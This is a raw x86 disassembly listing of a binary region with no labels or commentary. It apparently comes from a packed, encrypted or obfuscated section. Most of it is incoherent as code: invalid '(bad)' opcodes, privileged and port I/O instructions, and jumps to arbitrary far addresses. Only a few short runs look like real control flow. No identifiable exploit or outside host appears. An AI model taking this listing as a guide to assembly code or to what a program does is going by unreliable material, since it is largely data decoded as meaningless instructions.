  4089d8:	and    eax,DWORD PTR [esi-0x20]
  4089db:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4089dc:	out    0x3b,al
  4089de:	dec    esi
  4089df:	rcl    DWORD PTR [esi+0x12],cl
  4089e2:	lds    ecx,FWORD PTR [edx-0x65182f8d]
  4089e8:	xchg   edi,eax
  4089e9:	xor    DWORD PTR [ecx],ebx
  4089eb:	or     BYTE PTR [ecx-0x150b4400],0x60
  4089f2:	jp     0x4089c5
  4089f4:	out    0xde,eax
  4089f6:	mov    ch,0xb3
  4089f8:	dec    esi
  4089f9:	jp     0x4089d4
  4089fb:	dec    ebp
  4089fc:	push   ebp
  4089fd:	(bad)  [edi]
  4089ff:	sub    eax,0xe02e995e
  408a04:	sar    DWORD PTR [eax+0x79428b75],0x9f
  408a0b:	xchg   esp,eax
  408a0c:	shr    DWORD PTR [esi],1
  408a0e:	and    dl,BYTE PTR [ebp+0x33e2f7f2]
  408a14:	cli    
  408a15:	sub    ebx,DWORD PTR [esi-0x21]
  408a18:	sbb    bl,BYTE PTR ds:0x1eddc650
  408a1e:	clc    
  408a1f:	mov    eax,ds:0x85f1427a
  408a24:	mov    bl,bl
  408a26:	stos   BYTE PTR es:[edi],al
  408a27:	int    0xb3
  408a29:	hlt    
  408a2a:	adc    al,0x93
  408a2c:	test   DWORD PTR [edi-0x66a2a6af],0x819a791c
  408a36:	loop   0x408a68
  408a38:	lds    edi,FWORD PTR [eax-0x61]
  408a3b:	pop    edi
  408a3c:	cmp    al,0xc7
  408a3e:	imul   esi,DWORD PTR [ebx+0x20],0xfffffff4
  408a42:	mov    edi,0xa7d0b047
  408a47:	rol    BYTE PTR ds:0xafb6141c,1
  408a4d:	xchg   BYTE PTR [ecx+ebp*4],bh
  408a50:	test   al,0x51
  408a52:	fadd   QWORD PTR [eax+0x53]
  408a55:	push   eax
  408a56:	daa    
  408a57:	adc    al,BYTE PTR [eax-0x30]
  408a5a:	out    dx,eax
  408a5b:	jle    0x408a68
  408a5d:	fld    DWORD PTR [esi-0x62]
  408a60:	mov    dh,0x3e
  408a62:	xchg   esi,eax
  408a63:	xchg   esi,eax
  408a64:	out    0xb9,al
  408a66:	icebp  
  408a67:	dec    edx
  408a68:	(bad)  
  408a6a:	cli    
  408a6b:	icebp  
  408a6c:	xchg   edi,eax
  408a6d:	cli    
  408a6e:	jno    0x408a1f
  408a70:	jns    0x408aeb
  408a72:	mov    edx,0x5a46df5b
  408a77:	or     al,0xac
  408a79:	xor    eax,0xd661bd69
  408a7e:	push   0x6f
  408a80:	popf   
  408a81:	ret    0x60b2
  408a84:	mov    ebp,0x62426094
  408a89:	pop    esp
  408a8a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408a8b:	xor    al,0x48
  408a8d:	stos   DWORD PTR es:[edi],eax
  408a8e:	cli    
  408a8f:	sbb    bh,ah
  408a91:	and    al,0xe5
  408a93:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408a94:	add    eax,ebp
  408a96:	xchg   esi,eax
  408a97:	stos   BYTE PTR es:[edi],al
  408a98:	scas   al,BYTE PTR es:[edi]
  408a99:	retf   0xedde
  408a9c:	retf   
  408a9d:	sub    ecx,eax
  408a9f:	rol    DWORD PTR [edx+ecx*4+0x2b523c16],0x46
  408aa7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408aa8:	pop    ds
  408aa9:	frstor [ecx-0x72]
  408aac:	and    bl,BYTE PTR [edx-0x51]
  408aaf:	fstp   QWORD PTR ds:0x6b685fb
  408ab5:	mov    ebp,?
  408ab7:	repz pop edi
  408ab9:	fidiv  WORD PTR [ebx+edx*1-0x122f7a1d]
  408ac0:	addr16 (bad) 
  408ac2:	(bad)  
  408ac3:	xchg   edi,eax
  408ac4:	jne    0x408a76
  408ac6:	jo     0x408aae
  408ac8:	sti    
  408ac9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408aca:	(bad)  
  408acb:	mov    ecx,0x68959167
  408ad0:	jge    0x408b24
  408ad2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408ad3:	push   eax
  408ad4:	dec    eax
  408ad5:	nop
  408ad6:	shl    BYTE PTR [esi+0x8],1
  408ad9:	call   0x9325fdac
  408ade:	dec    ebx
  408adf:	adc    dh,al
  408ae1:	cmp    BYTE PTR [eax+0x5504d8e9],dh
  408ae7:	pop    ecx
  408ae8:	add    eax,0x9c0c071c
  408aed:	fwait
  408aee:	repnz daa 
  408af0:	add    dh,ah
  408af2:	sub    ecx,edi
  408af4:	inc    esi
  408af5:	cdq    
  408af6:	push   ds
  408af7:	dec    edi
  408af8:	outs   dx,BYTE PTR ds:[esi]
  408af9:	xor    dh,BYTE PTR [ebx]
  408afb:	lock or esi,ebp
  408afe:	popf   
  408aff:	add    cl,BYTE PTR [edi+0xa6f4023]
  408b05:	into   
  408b06:	lea    ecx,[edi-0x2e]
  408b09:	xor    al,BYTE PTR [ebp+0x1]
  408b0c:	adc    BYTE PTR [ecx+esi*1+0x7e],0xa8
  408b11:	cmc    
  408b12:	pop    ds
  408b13:	pusha  
  408b14:	jns    0x408aae
  408b16:	inc    ecx
  408b17:	push   eax
  408b18:	lea    esi,[ecx-0x709936c8]
  408b1e:	mov    esi,0x5c09f271
  408b23:	sub    ah,BYTE PTR [ebx+0x4f]
  408b26:	or     esp,ebp
  408b28:	pop    ss
  408b29:	xor    esp,ebx
  408b2b:	mov    ds,WORD PTR [eax+0x50990949]
  408b31:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408b32:	ins    BYTE PTR es:[edi],dx
  408b33:	mov    edi,0x8dc13cd7
  408b38:	mov    ds:0xa348263c,al
  408b3d:	jbe    0x408b26
  408b3f:	test   BYTE PTR [eax],ch
  408b41:	sbb    edx,DWORD PTR [esi]
  408b43:	mov    ch,0xae
  408b45:	in     al,dx
  408b46:	jge    0x408b13
  408b48:	sbb    bh,BYTE PTR [ebx+0x59]
  408b4b:	mov    edx,DWORD PTR [edx-0x23]
  408b4e:	data16 xchg BYTE PTR [esi+ebx*2],bh
  408b52:	and    eax,0x3080a3f0
  408b57:	shl    DWORD PTR [ecx-0x3d],cl
  408b5a:	xor    eax,0x8600a1a8
  408b5f:	cmp    eax,DWORD PTR [edx]
  408b61:	mov    BYTE PTR [edi-0x129eec2e],bh
  408b67:	ins    BYTE PTR es:[edi],dx
  408b68:	test   bh,ch
  408b6a:	xor    edi,ecx
  408b6c:	jne    0x408bb5
  408b6e:	bound  edx,QWORD PTR [eax-0x17]
  408b71:	push   edi
  408b72:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408b73:	and    ebp,esp
  408b75:	adc    al,0x89
  408b77:	neg    esi
  408b79:	std    
  408b7a:	ret    0xb9f2
  408b7d:	push   esi
  408b7e:	in     al,dx
  408b7f:	inc    edi
  408b80:	stos   BYTE PTR es:[edi],al
  408b81:	jnp    0x408b35
  408b83:	and    al,0x7a
  408b85:	fidivr DWORD PTR [edx-0x7d]
  408b88:	pop    esi
  408b89:	mov    dl,0xf8
  408b8b:	mov    ds:0xbd63f2ab,al
  408b90:	add    DWORD PTR [edi-0x55],esp
  408b93:	sub    edx,DWORD PTR [ebp+0x1903acd]
  408b99:	aad    0xe0
  408b9b:	inc    esp
  408b9c:	pop    ebp
  408b9d:	mov    edi,0x1f5c6b21
  408ba2:	xor    esi,0xfffffffd
  408ba5:	xor    edi,DWORD PTR [ebx]
  408ba7:	int3   
  408ba8:	rcl    ah,0xa8
  408bab:	pop    ds
  408bac:	mov    ds:0xc589a64e,al
  408bb1:	jmp    0x408b86
  408bb3:	mov    ch,0x51
  408bb5:	pusha  
  408bb6:	xchg   edx,eax
  408bb7:	test   BYTE PTR [eax*8+0x6567b12f],cl
  408bbe:	(bad)  
  408bbf:	mov    eax,0x827be6a9
  408bc4:	and    ebp,DWORD PTR [eax+0x7f]
  408bc7:	inc    esi
  408bc8:	sbb    BYTE PTR [ebx*4-0x1352a7e5],dl
  408bcf:	xor    BYTE PTR cs:[esp+esi*1+0x4d],ch
  408bd4:	inc    edx
  408bd5:	pusha  
  408bd6:	adc    ecx,DWORD PTR [esi+0x5054c151]
  408bdc:	push   ss
  408bdd:	pop    esp
  408bde:	adc    eax,DWORD PTR [esi]
  408be0:	xchg   DWORD PTR [eax+0x75],esi
  408be3:	xor    al,0xd1
  408be5:	fisubr DWORD PTR [edx+0x22]
  408be8:	pop    edi
  408be9:	sub    al,0x83
  408beb:	mov    bh,0x85
  408bed:	ja     0x408c46
  408bef:	pop    esi
  408bf0:	push   edi
  408bf1:	pop    ecx
  408bf2:	jae    0x408bcf
  408bf4:	mov    DWORD PTR [edi-0x18d54350],esi
  408bfa:	push   ecx
  408bfb:	xor    ebx,ebp
  408bfd:	loop   0x408b9a
  408bff:	jle    0x408c1b
  408c01:	or     eax,DWORD PTR [esi-0x555554b3]
  408c07:	xor    BYTE PTR [ebp-0x62],bh
  408c0a:	idiv   DWORD PTR [edx+0x7b30e463]
  408c10:	outs   dx,DWORD PTR ds:[esi]
  408c11:	pushf  
  408c12:	ss sub al,0xf
  408c15:	sub    BYTE PTR [edx],cl
  408c17:	clc    
  408c18:	ja     0x408c11
  408c1a:	sub    eax,0xadaa36ce
  408c1f:	retf   0x1b41
  408c22:	loope  0x408c49
  408c24:	mov    ecx,0x249fba53
  408c29:	inc    ebx
  408c2a:	mov    cl,0x51
  408c2c:	adc    eax,0x902ee8cd
  408c31:	fisttp DWORD PTR [edi+0x54]
  408c34:	mov    ebp,0xb1bfbc53
  408c39:	js     0x408c58
  408c3b:	scas   al,BYTE PTR es:[edi]
  408c3c:	jmp    0x408c42
  408c3e:	test   DWORD PTR [esi+ebx*8+0x15],esp
  408c42:	jle    0x408c4f
  408c44:	aaa    
  408c45:	jae    0x408bf4
  408c47:	pop    ecx
  408c48:	dec    ecx
  408c49:	xchg   ecx,edx
  408c4b:	dec    BYTE PTR [edx]
  408c4d:	push   DWORD PTR [ebp-0x10]
  408c50:	mov    eax,ds:0x41b264
  408c55:	mov    eax,DWORD PTR [eax]
  408c57:	push   DWORD PTR [eax]
  408c59:	lea    eax,ds:0x41b280
  408c5f:	jmp    0x408fac
  408c64:	mov    ebx,0x93838448
  408c69:	push   ebx
  408c6a:	mov    ebx,0x78da0248
  408c6f:	bound  ecx,QWORD PTR [edi+0x470f41d0]
  408c75:	fnstenv [eax+0x70]
  408c78:	and    BYTE PTR [ebp+0x70],bh
  408c7b:	jo     0x408cc4
  408c7d:	sahf   
  408c7e:	and    ecx,DWORD PTR [ebp+edx*2+0x31ddd886]
  408c85:	pop    edi
  408c86:	ins    DWORD PTR es:[edi],dx
  408c87:	sub    DWORD PTR [edx+0x19],esp
  408c8a:	int3   
  408c8b:	test   ebp,ecx
  408c8d:	pop    eax
  408c8e:	or     al,BYTE PTR [esi]
  408c90:	ins    BYTE PTR es:[edi],dx
  408c91:	(bad)  
  408c92:	mov    ds:0xaff696f0,eax
  408c97:	jg     0x408c90
  408c99:	popa   
  408c9a:	repz mov bh,0x23
  408c9d:	jns    0x408ccc
  408c9f:	les    esp,FWORD PTR [esp+edi*4+0x5caeb4bd]
  408ca6:	xchg   al,ch
  408ca8:	sbb    BYTE PTR [esi+0x41],0x24
  408cac:	aam    0x94
  408cae:	in     al,dx
  408caf:	outs   dx,BYTE PTR ds:[esi]
  408cb0:	jmp    0x430ea42d
  408cb5:	push   cs
  408cb6:	dec    ecx
  408cb7:	inc    ecx
  408cb8:	or     al,0x5d
  408cba:	into   
  408cbb:	std    
  408cbc:	push   esi
  408cbd:	enter  0xc38d,0x2b
  408cc1:	pop    edx
  408cc2:	test   eax,0x6da86742
  408cc7:	imul   esp,DWORD PTR [ebx-0x2607c964],0x51477b3c
  408cd1:	pop    ecx
  408cd2:	push   edi
  408cd3:	sahf   
  408cd4:	lods   al,BYTE PTR ds:[esi]
  408cd5:	jno    0x408cd6
  408cd7:	and    al,0x9d
  408cd9:	sub    al,0x98
  408cdb:	popa   
  408cdc:	mov    ebp,0x18bc74d3
  408ce1:	push   DWORD PTR [di]
  408ce4:	nop
  408ce5:	jo     0x408c7e
  408ce7:	mov    esp,0x9f27c111
  408cec:	in     eax,dx
  408ced:	scas   al,BYTE PTR es:[edi]
  408cee:	mov    ebp,0x6379017b
  408cf3:	repnz and dl,BYTE PTR [esi+0x3eccaaa0]
  408cfa:	xchg   DWORD PTR [ebp+0x10376a4b],ebp
  408d00:	sahf   
  408d01:	sbb    dh,cl
  408d03:	test   eax,0xf80ce10c
  408d08:	cli    
  408d09:	mov    esi,0x9cbdd2c2
  408d0e:	ret    0xe2f1
  408d11:	nop
  408d12:	inc    ebp
  408d13:	popf   
  408d14:	push   esi
  408d15:	ins    DWORD PTR es:[edi],dx
  408d16:	rcl    DWORD PTR [edx+0x24851ce0],1
  408d1c:	jbe    0x408d55
  408d1e:	jmp    0x408d26
  408d20:	xchg   ecx,eax
  408d21:	xchg   DWORD PTR [ebx-0x4e382333],esi
  408d27:	jmp    0xd47d3d69
  408d2c:	popa   
  408d2d:	push   edx
  408d2e:	int    0xb7
  408d30:	fbld   TBYTE PTR [ebx+ecx*8+0x11]
  408d34:	fld    QWORD PTR [esi-0x2d]
  408d37:	xor    DWORD PTR [esi+eiz*2-0x43],0xbecde76
  408d3f:	xchg   DWORD PTR [esi-0x4152c919],eax
  408d45:	sbb    DWORD PTR [eax],ebp
  408d47:	sbb    al,0x54
  408d49:	push   esp
  408d4a:	sbb    eax,0xe6676f8
  408d4f:	(bad)  
  408d50:	xor    cl,cl
  408d52:	in     al,dx
  408d53:	and    BYTE PTR ds:0x738dd33c,ch
  408d59:	add    ch,BYTE PTR [edx+0x2bf56780]
  408d5f:	pop    esp
  408d60:	test   al,0xab
  408d62:	add    BYTE PTR [edi-0x77],dh
  408d65:	das    
  408d66:	aaa    
  408d67:	test   BYTE PTR ds:[edi-0x6e],dh
  408d6b:	(bad)  [edi-0x52]
  408d6e:	add    BYTE PTR ds:0x14ac5b31,cl
  408d74:	pop    ecx
  408d75:	(bad)  
  408d76:	ss xchg edi,eax
  408d78:	pushf  
  408d79:	cdq    
  408d7a:	pop    esi
  408d7b:	hlt    
  408d7c:	int3   
  408d7d:	mov    esi,0xf0b6f41
  408d82:	pop    esi
  408d83:	mov    ds:0x14675cdf,eax
  408d88:	aad    0x93
  408d8a:	mov    edx,0xb071615f
  408d8f:	xor    al,0x7
  408d91:	sbb    al,0xb6
  408d93:	sbb    eax,0x632e0408
  408d98:	push   edi
  408d99:	inc    esi
  408d9a:	cmp    ecx,eax
  408d9c:	pop    eax
  408d9d:	mov    ds:0x39d5a2c9,al
  408da2:	sub    DWORD PTR [ebx-0x4e],0xffffffa7
  408da6:	aaa    
  408da7:	pop    edx
  408da8:	in     eax,dx
  408da9:	add    ebp,DWORD PTR [ebp+0x1b]
  408dac:	mov    ds:0x8e176f9c,al
  408db1:	inc    eax
  408db2:	cld    
  408db3:	pop    edi
  408db4:	adc    esi,DWORD PTR [edi]
  408db6:	je     0x408e02
  408db8:	dec    ecx
  408db9:	push   edx
  408dba:	pop    edi
  408dbb:	movlps xmm2,QWORD PTR [ebx]
  408dbe:	test   eax,0x90d75aa9
  408dc3:	sbb    al,0xef
  408dc6:	test   edi,esp
  408dc8:	xchg   ebp,eax
  408dc9:	and    eax,0x891692dc
  408dce:	hlt    
  408dcf:	dec    esi
  408dd0:	xchg   ebx,eax
  408dd1:	dec    ebp
  408dd2:	jae    0x408d9b
  408dd4:	ins    BYTE PTR es:[edi],dx
  408dd5:	arpl   WORD PTR [ebx],di
  408dd7:	(bad)  
  408dd8:	dec    edi
  408dd9:	pop    ds
  408dda:	push   esp
  408ddb:	xlat   BYTE PTR ds:[ebx]
  408ddc:	push   edi
  408ddd:	push   esp
  408dde:	(bad)  
  408ddf:	jp     0x408d88
  408de1:	jg     0x408da5
  408de3:	pusha  
  408de4:	adc    eax,DWORD PTR [edx]
  408de6:	jg     0x408db1
  408de8:	shr    DWORD PTR [esi-0x54564b81],1
  408dee:	xchg   DWORD PTR [ebp-0x64],ebp
  408df1:	and    esp,DWORD PTR [eax-0x6394da42]
  408df7:	add    cl,BYTE PTR [esi+0x74]
  408dfa:	js     0x408e4e
  408dfc:	add    DWORD PTR ss:[esi],ebx
  408dff:	repz pop ecx
  408e01:	xor    esi,edi
  408e03:	iret   
  408e04:	pop    esp
  408e05:	xchg   edi,eax
  408e06:	imul   ebp,DWORD PTR [ebx+0x2d374e1e],0x49e154f9
  408e10:	push   esp
  408e11:	sbb    al,0x3c
  408e13:	les    ebx,FWORD PTR [esi]
  408e15:	pop    eax
  408e16:	inc    edx
  408e17:	mov    al,0xec
  408e19:	dec    edx
  408e1a:	jnp    0x408ddf
  408e1c:	shl    DWORD PTR [edi],0xc1
  408e1f:	dec    ebx
  408e20:	ins    BYTE PTR es:[edi],dx
  408e21:	and    eax,0xc4892c56
  408e26:	mov    ah,0x9
  408e28:	jns    0x408db2
  408e2a:	or     eax,0x23650013
  408e2f:	rcr    BYTE PTR [edx-0x14],0xcd
  408e33:	loop   0x408e7d
  408e35:	(bad)  
  408e36:	stc    
  408e37:	jg     0x408e4b
  408e39:	inc    ebp
  408e3a:	lock ins BYTE PTR es:[edi],dx
  408e3c:	dec    eax
  408e3d:	dec    ebp
  408e3e:	js     0x408dcf
  408e40:	pop    ebp
  408e41:	sub    eax,0xb5202936
  408e46:	add    DWORD PTR [edx+0x5d],eax
  408e49:	pop    ecx
  408e4a:	lods   al,BYTE PTR ds:[esi]
  408e4b:	or     DWORD PTR [edx+0x16578ca8],esi
  408e51:	repnz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408e53:	pop    eax
  408e54:	cmp    eax,0xc504f158
  408e59:	sar    BYTE PTR [edi],0xc7
  408e5c:	rol    DWORD PTR [edx],0xca
  408e5f:	js     0x408ed9
  408e61:	outs   dx,BYTE PTR ds:[esi]
  408e62:	fdivr  DWORD PTR [esi-0x45]
  408e65:	out    0xa1,eax
  408e67:	mov    ebp,0x4d214475
  408e6c:	scas   al,BYTE PTR es:[edi]
  408e6d:	sahf   
  408e6e:	push   cs
  408e6f:	dec    ecx
  408e70:	xor    eax,0xb8a9c9ad
  408e75:	pop    ds
  408e76:	pop    esi
  408e77:	(bad)  
  408e78:	dec    BYTE PTR [edx+0x5f]
  408e7b:	pop    edi
  408e7c:	(bad)  
  408e7d:	mov    ecx,DWORD PTR ds:0xde5f5481
  408e83:	push   edi
  408e84:	pop    esi
  408e85:	or     eax,0x9a835434
  408e8a:	sbb    BYTE PTR [ebx],dl
  408e8c:	outs   dx,DWORD PTR ds:[esi]
  408e8d:	gs jmp 0x99a7:0xa15ee0d5
  408e95:	fstp   TBYTE PTR [ebp-0x65]
  408e98:	ins    DWORD PTR es:[edi],dx
  408e99:	push   ebp
  408e9a:	and    ebx,edx
  408e9c:	sbb    DWORD PTR [eax+ebp*2+0x6f],ecx
  408ea0:	dec    eax
  408ea1:	(bad)  
  408ea2:	mov    ecx,0xc4e7de79
  408ea7:	pushf  
  408ea8:	mov    ecx,0xef3295b7
  408ead:	or     al,0x6c
  408eaf:	in     al,0xc8
  408eb1:	(bad)  
  408eb2:	ror    BYTE PTR [ebx],1
  408eb4:	mov    al,ds:0x594e4630
  408eb9:	push   ebx
  408eba:	mov    ecx,0x2972c1e5
  408ebf:	dec    esi
  408ec0:	dec    edx
  408ec1:	sahf   
  408ec2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408ec3:	dec    ebp
  408ec4:	inc    esp
  408ec5:	push   0x15
  408ec7:	retf   
  408ec8:	(bad)  
  408ec9:	jb     0x408e86
  408ecb:	in     eax,dx
  408ecc:	sbb    ecx,ecx
  408ece:	sbb    bh,BYTE PTR [ecx]
  408ed0:	and    edi,DWORD PTR [esi]
  408ed2:	and    eax,0xd6a159c0
  408ed7:	dec    ebx
  408ed8:	inc    esi
  408ed9:	pop    ds
  408eda:	add    BYTE PTR [edi],0xc6
  408edd:	ja     0x408f0e
  408edf:	sub    esi,edx
  408ee1:	xchg   edi,eax
  408ee2:	test   al,0xf7
  408ee4:	mov    DWORD PTR [ebx+0xcd3f4c5],0xfae2ddb9
  408eee:	pop    ecx
  408eef:	ret    
  408ef0:	stc    
  408ef1:	lahf   
  408ef2:	fadd   QWORD PTR [edi-0xb]
  408ef5:	ret    0xbdeb
  408ef8:	mov    al,bh
  408efa:	div    DWORD PTR [ebp+eax*1+0x718219f7]
  408f01:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408f02:	xchg   esp,eax
  408f03:	mov    cl,BYTE PTR [ebp+0x3e9851e0]
  408f09:	or     DWORD PTR [ecx],esi
  408f0b:	mov    ch,0xfe
  408f0d:	mov    bl,0x17
  408f0f:	xor    al,0xcd
  408f11:	enter  0xf0dc,0x1a
  408f15:	fild   QWORD PTR [eax]
  408f17:	cmp    eax,0xdc56aab8
  408f1c:	sub    bl,BYTE PTR [esi-0x1c863077]
  408f22:	cmp    bh,ah
  408f24:	pop    ecx
  408f25:	push   edx
  408f26:	bswap  esp
  408f28:	sub    DWORD PTR ds:0xb61c50af,eax
  408f2e:	xor    DWORD PTR [edx],ebx
  408f30:	je     0x408f4f
  408f32:	mov    ah,0xfe
  408f34:	mov    esi,0x343b6b16
  408f39:	xchg   BYTE PTR [ecx],dl
  408f3b:	push   esi
  408f3c:	mov    dl,BYTE PTR [ebx+0x45]
  408f3f:	lahf   
  408f40:	mov    eax,ds:0xdac59518
  408f45:	dec    esi
  408f46:	cwde   
  408f47:	stc    
  408f48:	cli    
  408f49:	add    eax,0x2ae0ef74
  408f4e:	pop    ecx
  408f4f:	pop    ebp
  408f50:	cli    
  408f51:	xor    eax,0x203e249b
  408f56:	xor    bl,bh
  408f58:	sbb    bl,ah
  408f5a:	aad    0x15
  408f5c:	pop    esp
  408f5d:	pop    ss
  408f5e:	aas    
  408f5f:	mov    ds:0x2a1881b1,eax
  408f64:	mov    ah,BYTE PTR [ebx]
  408f66:	xchg   ebp,eax
  408f67:	inc    ebx
  408f68:	sub    BYTE PTR [edx],ch
  408f6a:	inc    edi
  408f6b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408f6c:	stc    
  408f6d:	adc    eax,0x6d5d5f01
  408f72:	gs loopne 0x408faf
  408f75:	xchg   BYTE PTR [ebx-0x72],al
  408f78:	xchg   BYTE PTR [edi+0x73],dl
  408f7b:	into   
  408f7c:	sbb    ebp,DWORD PTR [ebp-0x5081b47b]
  408f82:	and    ah,ch
  408f84:	mov    DWORD PTR [ecx],ebp
  408f86:	jno    0x408f47
  408f88:	cmp    ch,BYTE PTR [ebx+0x30]
  408f8b:	add    eax,0x16117579
  408f90:	push   cs
  408f91:	push   edi
  408f92:	or     ebp,DWORD PTR [ebx+0x45]
  408f95:	out    0x3b,eax
  408f97:	sahf   
  408f98:	shr    ecx,1
  408f9a:	shr    DWORD PTR [eax+0x5474ed16],1
  408fa0:	mov    ch,al
  408fa2:	xchg   edi,eax
  408fa3:	cmc    
  408fa4:	dec    ebx
  408fa5:	fucom  st(3)
  408fa7:	loopne 0x408ff9
  408fa9:	jecxz  0x408fd6
  408fab:	popa   
  408fac:	push   DWORD PTR [eax]
  408fae:	lea    eax,ds:0x41b02c
  408fb4:	jmp    0x409301
  408fb9:	add    al,0x7c
  408fbb:	out    0xcb,eax
  408fbd:	out    0xf3,eax
  408fbf:	xor    al,0xd3
  408fc1:	call   0xcb1937f3
  408fc6:	outs   dx,BYTE PTR ds:[esi]
  408fc7:	ss mov edi,0x7070e677
  408fcd:	and    BYTE PTR [ebp+0x70],bh
  408fd0:	jo     0x408feb
  408fd2:	pop    es
  408fd3:	and    ebx,esp
  408fd5:	(bad)  
  408fd6:	data16 jae 0x40902b
  408fd9:	sub    BYTE PTR [ebp+0x6c],cl
  408fdc:	and    al,0xf
  408fde:	int    0xb
  408fe0:	shl    BYTE PTR [ebx-0x2a4207dc],1
  408fe6:	jmp    0x5e993b48
  408feb:	loope  0x408fc5
  408fed:	stc    
  408fee:	ja     0x408fcf
  408ff0:	and    DWORD PTR [ecx+eiz*1],esi
  408ff3:	or     edx,eax
  408ff5:	ror    BYTE PTR gs:[eax],1
  408ff8:	outs   dx,BYTE PTR ds:[esi]
  408ff9:	in     al,0xfa
  408ffb:	adc    ah,BYTE PTR [eax]
  408ffd:	std    
  408ffe:	lods   eax,DWORD PTR ds:[esi]
  408fff:	cdq    
  409000:	scas   eax,DWORD PTR es:[edi]
  409001:	sti    
  409002:	sub    bl,BYTE PTR [eax]
  409004:	add    eax,0xb2a09c08
  409009:	out    dx,eax
  40900a:	add    al,0xfb
  40900c:	adc    BYTE PTR [ebp+0x23],0x68
  409010:	out    dx,al
  409011:	aam    0xd5
  409013:	jmp    0x950e:0x214e64be
  40901a:	inc    ecx
  40901b:	stos   BYTE PTR es:[edi],al
  40901c:	lods   eax,DWORD PTR ds:[esi]
  40901d:	ss stc 
  40901f:	sub    BYTE PTR [edx+0x3d0c1f25],cl
  409025:	mov    ds:0x86f95bac,eax
  40902a:	hlt    
  40902b:	retf   
  40902c:	test   BYTE PTR [ebx+0x4b],dl
  40902f:	mov    eax,0x874ec416
  409034:	sar    DWORD PTR [edx+0x62],0x37
  409038:	ja     0x409003
  40903a:	fwait
  40903b:	push   ds
  40903c:	iret   
  40903d:	scas   eax,DWORD PTR es:[edi]
  40903e:	retf   
  40903f:	ret    0x82a9
  409042:	pushf  
  409043:	fdiv   DWORD PTR [esi-0x669fbeaa]
  409049:	adc    BYTE PTR [edi+0x166ec507],cl
  40904f:	cmp    DWORD PTR [ecx+eax*8-0x12],esp
  409053:	pushf  
  409054:	push   edx
  409055:	dec    ecx
  409056:	hlt    
  409057:	sub    dh,dh
  409059:	in     al,0xb1
  40905b:	aas    
  40905c:	xor    DWORD PTR [edx-0x3],esi
  40905f:	(bad)  
  409060:	aam    0xca
  409062:	sub    al,ah
  409064:	lea    esp,[ebp-0x7f]
  409067:	adc    esp,edi
  409069:	inc    ecx
  40906a:	sub    ebx,DWORD PTR [edx-0x1e]
  40906d:	test   eax,0x2989122c
  409072:	pop    ds
  409073:	cmovb  edx,DWORD PTR [edi]
  409076:	sbb    DWORD PTR [ebx],edx
  409078:	add    DWORD PTR [ebx],edi
  40907a:	(bad)  
  40907c:	nop
  40907d:	push   esi
  40907e:	inc    esp
  40907f:	push   0x14
  409081:	xchg   esp,eax
  409082:	(bad)  [ecx]
  409084:	std    
  409085:	cld    
  409086:	and    eax,0x27e42c7a
  40908b:	(bad)
  40908e:	dec    eax
  40908f:	fiadd  DWORD PTR [edi+0x5d]
  409092:	mov    ebx,0xf1aa39df
  409097:	mov    ds:0xba577337,eax
  40909c:	adc    DWORD PTR [eax+ebp*8],0x3d
  4090a0:	xlat   BYTE PTR ds:[ebx]
  4090a1:	inc    edx
  4090a2:	and    esi,esp
  4090a4:	in     al,0x7d
  4090a6:	popf   
  4090a7:	pop    esp
  4090a8:	loopne 0x4090bf
  4090aa:	inc    ecx
  4090ab:	pop    esi
  4090ac:	push   ebx
  4090ad:	adc    cl,BYTE PTR [edx+0x55]
  4090b0:	push   ecx
  4090b1:	xchg   edx,eax
  4090b2:	fidivr DWORD PTR [ebp+edx*1+0x2bb9a9ed]
  4090b9:	stos   BYTE PTR es:[edi],al
  4090ba:	shr    BYTE PTR [ecx+0x7a],1
  4090bd:	xchg   ebx,eax
  4090be:	ds out dx,eax
  4090c0:	test   DWORD PTR [ecx-0x56e4f4c],esi
  4090c6:	jg     0x4090b9
  4090c8:	or     DWORD PTR [ecx-0x598adf29],ebp
  4090ce:	xor    dh,BYTE PTR [edi]
  4090d0:	mov    edi,ebp
  4090d2:	push   es
  4090d3:	js     0x409143
  4090d5:	push   eax
  4090d6:	das    
  4090d7:	xchg   ebx,eax
  4090d8:	and    esi,DWORD PTR [ecx-0x1f68b0e1]
  4090de:	icebp  
  4090df:	adc    esp,0xc170a2d3
  4090e5:	(bad)  
  4090e6:	pop    ss
  4090e7:	ins    BYTE PTR es:[edi],dx
  4090e8:	push   eax
  4090e9:	aam    0x73
  4090eb:	inc    eax
  4090ec:	scas   al,BYTE PTR es:[edi]
  4090ed:	je     0x4090e7
  4090ef:	call   0x78de:0x55a3d75d
  4090f6:	nop
  4090f7:	or     BYTE PTR [ebx-0x4da2a336],0xf4
  4090fe:	sub    dh,BYTE PTR [eax]
  409100:	xor    al,0xe0
  409102:	rcl    al,1
  409104:	repz mov bl,0x50
  409107:	sbb    al,0x15
  409109:	dec    ebx
  40910a:	jbe    0x4090c8
  40910c:	push   esi
  40910d:	push   edx
  40910e:	adc    DWORD PTR [ecx],esi
  409110:	repnz (bad)
  409113:	cdq    
  409114:	(bad)  
  409115:	in     eax,0x11
  409117:	sbb    dh,BYTE PTR [ecx]
  409119:	jmp    0x3405:0x834bc537
  409120:	and    eax,0xc8241595
  409125:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409126:	push   0x1cdf43c1
  40912b:	jle    0x409115
  40912d:	xor    edx,0xfffffff8
  409130:	imul   esp,esi,0xfffffff9
  409133:	push   ebx
  409134:	jecxz  0x4090ea
  409136:	(bad)  
  409137:	test   al,0x9c
  409139:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40913a:	xchg   ecx,eax
  40913b:	dec    edx
  40913c:	jp     0x409113
  40913e:	icebp  
  40913f:	rcl    BYTE PTR [ecx-0x22d6884a],0xe3
  409146:	stc    
  409147:	or     BYTE PTR [edx+0x54],bl
  40914a:	xchg   esp,eax
  40914b:	sub    bl,BYTE PTR [esi+0x1a]
  40914e:	sub    bl,BYTE PTR [edx]
